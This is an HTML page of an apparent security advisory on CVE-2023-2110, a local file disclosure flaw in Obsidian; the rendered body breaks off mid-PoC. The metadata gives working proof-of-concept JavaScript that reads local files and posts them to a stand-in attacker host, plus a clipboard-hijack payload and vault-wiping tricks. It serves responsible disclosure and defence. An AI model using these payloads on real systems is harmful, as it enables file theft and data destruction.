@@ -1,0 +1,534 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>(CVE-2023-2110) Obsidian Local File Disclosure | STAR Labs</title>
+<meta name="keywords" content="">
+<meta name="description" content="Summary:    Product Obsidian     Vendor Obsidian   Severity High   Affected Versions Obsidian &lt; 1.2.8   Tested Versions Obsidian 1.1.16   CVE Identifier CVE-2023-2110   CVE Description Improper path handling in Obsidian desktop before 1.2.8 on Windows, Linux and macOS allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;app://local/&lt;absolute-path&gt;&rdquo;. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian.">
+<meta name="author" content="Li Jiantao (@CurseRed)">
+<link rel="canonical" href="https://starlabs.sg/advisories/23/23-2110/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
+<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
+<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="(CVE-2023-2110) Obsidian Local File Disclosure" />
+<meta property="og:description" content="Summary:    Product Obsidian     Vendor Obsidian   Severity High   Affected Versions Obsidian &lt; 1.2.8   Tested Versions Obsidian 1.1.16   CVE Identifier CVE-2023-2110   CVE Description Improper path handling in Obsidian desktop before 1.2.8 on Windows, Linux and macOS allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;app://local/&lt;absolute-path&gt;&rdquo;. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://starlabs.sg/advisories/23/23-2110/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
+<meta property="article:published_time" content="2023-08-19T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-08-19T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>
+
+<meta name="twitter:title" content="(CVE-2023-2110) Obsidian Local File Disclosure"/>
+<meta name="twitter:description" content="Summary:    Product Obsidian     Vendor Obsidian   Severity High   Affected Versions Obsidian &lt; 1.2.8   Tested Versions Obsidian 1.1.16   CVE Identifier CVE-2023-2110   CVE Description Improper path handling in Obsidian desktop before 1.2.8 on Windows, Linux and macOS allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;app://local/&lt;absolute-path&gt;&rdquo;. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Advisories",
+      "item": "https://starlabs.sg/advisories/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "(CVE-2023-2110) Obsidian Local File Disclosure",
+      "item": "https://starlabs.sg/advisories/23/23-2110/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "(CVE-2023-2110) Obsidian Local File Disclosure",
+  "name": "(CVE-2023-2110) Obsidian Local File Disclosure",
+  "description": "Summary:    Product Obsidian     Vendor Obsidian   Severity High   Affected Versions Obsidian \u0026lt; 1.2.8   Tested Versions Obsidian 1.1.16   CVE Identifier CVE-2023-2110   CVE Description Improper path handling in Obsidian desktop before 1.2.8 on Windows, Linux and macOS allows a crafted webpage to access local files and exfiltrate them to remote web servers via \u0026ldquo;app://local/\u0026lt;absolute-path\u0026gt;\u0026rdquo;. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Summary:    Product Obsidian     Vendor Obsidian   Severity High   Affected Versions Obsidian   Tested Versions Obsidian 1.1.16   CVE Identifier CVE-2023-2110   CVE Description Improper path handling in Obsidian desktop before 1.2.8 on Windows, Linux and macOS allows a crafted webpage to access local files and exfiltrate them to remote web servers via “app://local/”. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian.   CWE Classification(s) CWE-22 Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)   CAPEC Classification(s) CAPEC-597 Absolute Path Traversal    CVSS3.1 Scoring System: Base Score: 8.2 (High)\nVector String: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N\n   Metric Value     Attack Vector (AV) Local   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) Required   Scope (S) Changed   Confidentiality (C) High   Integrity (I) High   Availability (A) None    Product Overview: Obsidian is a markdown editor designed for knowledge workers and researchers that has gained significant popularity in recent years. One of its main features is its ability to create links between notes, allowing users to easily organize and navigate their ideas.\nObsidian is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding images from local filesystem. An attacker can use the vulnerability to access arbitrary local files from a malicious webpage loaded in the markdown editor.\nVulnerability Summary: There is a Local File Disclosure vulnerability in app://local/ in Obsidian desktop client, allowing a crafted webpage to access local files and exfiltrate them to remote web servers. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian.\nVulnerability Details: In resources/app.asar/main.js, a custom URL scheme app:// is registered via electron.protocol.registerFileProtocol API. This URL scheme is designed for loading local resources embedded in the markdown file. For example, an image in markdown syntax ![](img1.png) will be converted to HTML img tag  for preview:\nThe following code snippet is the function handling app:// :\nlet SCHEME = 'app'; let PROTOCOL = SCHEME + '://'; let APP_URL_ROOT = PROTOCOL + 'obsidian.md/'; let FILE_ROOT = PROTOCOL + 'local/'; // ... protocol.registerFileProtocol('app', (req, callback) = { let url = req.url; let noframe = false; // ...  if (url.indexOf(FILE_ROOT) === 0) { url = decodeURIComponent(url.substr(FILE_ROOT.length)); if (!isWin) { url = '/' + url; } url = path.resolve(url); // [1]  // Disallow framing if the path is a UNC path  if (isUncPath(url)) { noframe = true; } } // Don't allow iframes from different origins to access local files  let referrer = req.referrer; if (referrer \u0026\u0026 referrer.indexOf(PROTOCOL) !== 0) { // [2]  noframe = true; url = ''; } let headers = {}; if (noframe) { headers['X-Frame-Options'] = 'DENY'; } callback({ path: url, headers }); }); When the URL of a request starts with app://local/, the remainder of the URL is resolved by path.resolve as an absolute path at [1].\nAt [2], if the request comes with a referrer header and the value does not start with app://, this request will be assumed to originate from an iframe, and the URL will be set to empty to prevent external webpage from loading local resources.\nHowever, it was discovered that loading an external webpage in iframe and executing the following JavaScript code will send an empty referer header to app://local/, which led to bypassing the referer check and disclosing the contents of any local files:\nr = new XMLHttpRequest(); r.open('GET', 'app://local/C:/windows/win.ini'); r.addEventListener('load', e = { let result = e.currentTarget.responseText; console.log(result); }); r.send(); Exploit Conditions: This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file or canvas file in Obsidian, or (2) copy text from a malicious webpage and paste it into Obsidian.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:\n html lang=\"en\" body script window.location = `data:text/html,(${payload.toString()})()\\x3c/script`; function payload() { let filename = 'app://local/'; if(navigator.platform === 'Win32'){ filename += 'C:/Windows/win.ini'; } else if(navigator.platform.startsWith('Linux')){ filename += '/proc/self/root/etc/passwd' } let r = new XMLHttpRequest(); r.open('GET', filename); r.addEventListener('load', e = { let result = e.currentTarget.responseText; console.log(result); confirm(result) fetch('http://example.localtest.me/send-file-to-attacker-server', {method: 'post', mode: 'no-cors', body: result}) }); r.send(); } script body html Save the above HTML file as poc1.html and serve it on a webserver, then append this line to any markdown file in Obsidian: . Once the PoC is loaded in the iframe, it will:\n Try to read C:/Windows/win.ini on Windows, or /etc/passwd on Linux, Show the content of the file in a dialog, Send the file to external URL on example.localtest.me (this domain resolves to 127.0.0.1 for demonstration purposes only).  Note: A live version of poc1.html can be found at https://o.cal1.cn/e6c33c0a905bde0f-obsidian-local-file-disclosure-poc/poc1.html\nAttack Scenario: Scenario 1: Open a malicious markdown file An attacker can inject an iframe tag in a markdown file and convince the victim to open it in Obsidian to trigger the payload.\nScenario 2: Copy and paste from a webpage An attacker can craft a malicious webpage and hook on the copy event with the following code:\nscript document.addEventListener('copy',e={ e.preventDefault(); let payload = `![](\"`; e.clipboardData.setData('text/html', payload + window.getSelection()); }) script When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Obsidian.\nNote: A live version of copy-and-paste PoC can be found here.\nAdditional Notes:   It is possible to add style=\"display:none\" attribute to the iframe to make the exploit invisible.\n  An attacker can get a list of recently opened vaults from:\n app://local/proc/self/cwd/.config/obsidian/obsidian.json on Linux, or app://local/..%252f..%252fRoaming%2fObsidian%2fobsidian.json on Windows  Then get a file list of each vault from app://local/PATH-TO-VAULT/.obsidian/workspace.json, and finally reads every file in the vault. In another word, an attacker can exploit this vulnerability to leak most of the contents in the victim’s vaults.\nAn example of such exploit can be found at https://o.cal1.cn/e6c33c0a905bde0f-obsidian-local-file-disclosure-poc/poc2.html\n  Once the attacker obtained vault id from obsidian.json, it is possible to append arbitrary content to existing markdown files via obsidian://new.\nFor example, executing location = 'obsidian://new?file=Untitled.md\u0026vault=56cc6ab7be5a53d5\u0026append=1\u0026content=appended-content' will add “appended-content” at the end of Untitled.md in the specified vault. This would make this vulnerability wormable, as the attacker is able to append the same payload invisibly to the victim’s other markdown files.\nIt is also possible for attacker to purge the files via the overwrite param: location = 'obsidian://new?file=Untitled.md\u0026vault=56cc6ab7be5a53d5\u0026overwrite=1\u0026content=REMOVED'. This will seriously compromise the integrity of the user’s data.\n  Suggested Mitigations: Prohibit http(s) webpages from accessing app:// resources. It is also recommended to limit the local resources to be loaded only from the current vault directory.\nFor end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file or canvas file should not be opened in Obsidian, and (2) copying text from an untrusted webpage then pasting it into Obsidian should be avoided.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by checking the presence of iframe tags loading suspicious URLs in markdown files.\nCredits: Li Jiantao (@CurseRed) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline:  2023-04-28 Vendor Disclosure 2023-05-03 Vendor Patch Release 2023-08-19 Public Release  ",
+  "wordCount" : "1202",
+  "inLanguage": "en",
+  "datePublished": "2023-08-19T00:00:00Z",
+  "dateModified": "2023-08-19T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Li Jiantao (@CurseRed)"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://starlabs.sg/advisories/23/23-2110/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "STAR Labs",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://starlabs.sg/logo-white.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
+                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
+                    height="35"> </a>
+            <span class="logo-switches">
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://starlabs.sg/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/advisories/" title="Advisories">
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/publications/" title="Publications">
+                    <span>Publications</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
+    <h1 class="post-title">
+      (CVE-2023-2110) Obsidian Local File Disclosure
+    </h1>
+    <div class="post-meta"><span title='2023-08-19 00:00:00 +0000 UTC'>August 19, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Li Jiantao (@CurseRed)
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
+                <li>
+                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
+                <li>
+                    <a href="#product-overview" aria-label="Product Overview:">Product Overview:</a></li>
+                <li>
+                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary:">Vulnerability Summary:</a></li>
+                <li>
+                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
+                <li>
+                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
+                <li>
+                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
+                <li>
+                    <a href="#attack-scenario" aria-label="Attack Scenario:">Attack Scenario:</a><ul>
+                        
+                <li>
+                    <a href="#scenario-1-open-a-malicious-markdown-file" aria-label="Scenario 1: Open a malicious markdown file">Scenario 1: Open a malicious markdown file</a></li>
+                <li>
+                    <a href="#scenario-2-copy-and-paste-from-a-webpage" aria-label="Scenario 2: Copy and paste from a webpage">Scenario 2: Copy and paste from a webpage</a></li>
+                <li>
+                    <a href="#additional-notes" aria-label="Additional Notes:">Additional Notes:</a></li></ul>
+                </li>
+                <li>
+                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations:">Suggested Mitigations:</a></li>
+                <li>
+                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
+                <li>
+                    <a href="#credits" aria-label="Credits:">Credits:</a></li>
+                <li>
+                    <a href="#timeline" aria-label="Timeline:">Timeline:</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<table>
+<thead>
+<tr>
+<th><strong>Product</strong></th>
+<th>Obsidian</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Vendor</strong></td>
+<td>Obsidian</td>
+</tr>
+<tr>
+<td><strong>Severity</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Affected Versions</strong></td>
+<td>Obsidian &lt; 1.2.8</td>
+</tr>
+<tr>
+<td><strong>Tested Versions</strong></td>
+<td>Obsidian 1.1.16</td>
+</tr>
+<tr>
+<td><strong>CVE Identifier</strong></td>
+<td>CVE-2023-2110</td>
+</tr>
+<tr>
+<td><strong>CVE Description</strong></td>
+<td>Improper path handling in Obsidian desktop before 1.2.8 on Windows, Linux and macOS allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;app://local/&lt;absolute-path&gt;&rdquo;. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian.</td>
+</tr>
+<tr>
+<td><strong>CWE Classification(s)</strong></td>
+<td>CWE-22 Improper Limitation of a Pathname to a Restricted Directory (&lsquo;Path Traversal&rsquo;)</td>
+</tr>
+<tr>
+<td><strong>CAPEC Classification(s)</strong></td>
+<td>CAPEC-597 Absolute Path Traversal</td>
+</tr>
+</tbody>
+</table>
+<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
+<p><strong>Base Score:</strong> 8.2 (High)<br>
+<strong>Vector String:</strong> <code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N</code></p>
+<table>
+<thead>
+<tr>
+<th><strong>Metric</strong></th>
+<th><strong>Value</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Attack Vector (AV)</strong></td>
+<td>Local</td>
+</tr>
+<tr>
+<td><strong>Attack Complexity (AC)</strong></td>
+<td>Low</td>
+</tr>
+<tr>
+<td><strong>Privileges Required (PR)</strong></td>
+<td>None</td>
+</tr>
+<tr>
+<td><strong>User Interaction (UI)</strong></td>
+<td>Required</td>
+</tr>
+<tr>
+<td><strong>Scope (S)</strong></td>
+<td>Changed</td>
+</tr>
+<tr>
+<td><strong>Confidentiality (C)</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Integrity (I)</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Availability (A)</strong></td>
+<td>None</td>
+</tr>
+</tbody>
+</table>
+<h2 id="product-overview">Product Overview:<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
+<p>Obsidian is a markdown editor designed for knowledge workers and researchers that has gained significant popularity in recent years. One of its main features is its ability to create links between notes, allowing users to easily organize and navigate their ideas.</p>
+<p>Obsidian is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding images from local filesystem. An attacker can use the vulnerability to access arbitrary local files from a malicious webpage loaded in the markdown editor.</p>
+<h2 id="vulnerability-summary">Vulnerability Summary:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
+<p>There is a Local File Disclosure vulnerability in <code>app://local/</code> in Obsidian desktop client, allowing a crafted webpage to access local files and exfiltrate them to remote web servers. This vulnerability can be exploited if a user opens a malicious markdown file in Obsidian, or copies text from a malicious webpage and paste it into Obsidian.</p>
+<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
+<p>In <code>resources/app.asar/main.js</code>, a custom URL scheme <code>app://</code> is registered via <code>electron.protocol.registerFileProtocol</code> API. This URL scheme is designed for loading local resources embedded in the markdown file. For example, an image in markdown syntax <code>![](img1.png)</code> will be converted to HTML img tag <code>&lt;img src=&quot;app://local/C:/Users/cr/Documents/md/img1.png?1681587426400&quot;&gt;</code> for preview:</p>
+<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2110_01-local-image-loaded-via-app-url-scheme.jpg" alt=""  />
+</p>
+<p>The following code snippet is the function handling <code>app://</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">SCHEME</span> <span class="o">=</span> <span class="s1">&#39;app&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">PROTOCOL</span> <span class="o">=</span> <span class="nx">SCHEME</span> <span class="o">+</span> <span class="s1">&#39;://&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">APP_URL_ROOT</span> <span class="o">=</span> <span class="nx">PROTOCOL</span> <span class="o">+</span> <span class="s1">&#39;obsidian.md/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">FILE_ROOT</span> <span class="o">=</span> <span class="nx">PROTOCOL</span> <span class="o">+</span> <span class="s1">&#39;local/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">protocol</span><span class="p">.</span><span class="nx">registerFileProtocol</span><span class="p">(</span><span class="s1">&#39;app&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">noframe</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">FILE_ROOT</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">FILE_ROOT</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isWin</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span> <span class="o">+</span> <span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>    <span class="c1">// [1]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Disallow framing if the path is a UNC path
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">isUncPath</span><span class="p">(</span><span class="nx">url</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">noframe</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Don&#39;t allow iframes from different origins to access local files
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">referrer</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">referrer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">referrer</span> <span class="o">&amp;&amp;</span> <span class="nx">referrer</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">PROTOCOL</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>     <span class="c1">// [2]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">noframe</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">headers</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">noframe</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">headers</span><span class="p">[</span><span class="s1">&#39;X-Frame-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;DENY&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">callback</span><span class="p">({</span> <span class="nx">path</span><span class="o">:</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">headers</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>When the URL of a request starts with <code>app://local/</code>, the remainder of the URL is resolved by <code>path.resolve</code> as an absolute path at <code>[1]</code>.</p>
+<p>At <code>[2]</code>, if the request comes with a <code>referrer</code> header and the value does not start with <code>app://</code>, this request will be assumed to originate from an iframe, and the URL will be set to empty to prevent external webpage from loading local resources.</p>
+<p>However, it was discovered that loading an external webpage in iframe and executing the following JavaScript code will send an empty referer header to <code>app://local/</code>, which led to bypassing the referer check and disclosing the contents of any local files:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">r</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;app://local/C:/windows/win.ini&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">r</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">currentTarget</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/advisories/23/images/CVE-2023-2110_02-read-local-file-from-external-webpage.png" alt=""  />
+</p>
+<h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
+<p>This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file or canvas file in Obsidian, or (2) copy text from a malicious webpage and paste it into Obsidian.</p>
+<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
+<p>We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="sb">`data:text/html,&lt;script&gt;(</span><span class="si">${</span><span class="nx">payload</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span><span class="si">}</span><span class="sb">)()\x3c/script&gt;`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">payload</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">filename</span> <span class="o">=</span> <span class="s1">&#39;app://local/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">platform</span> <span class="o">===</span> <span class="s1">&#39;Win32&#39;</span><span class="p">){</span>
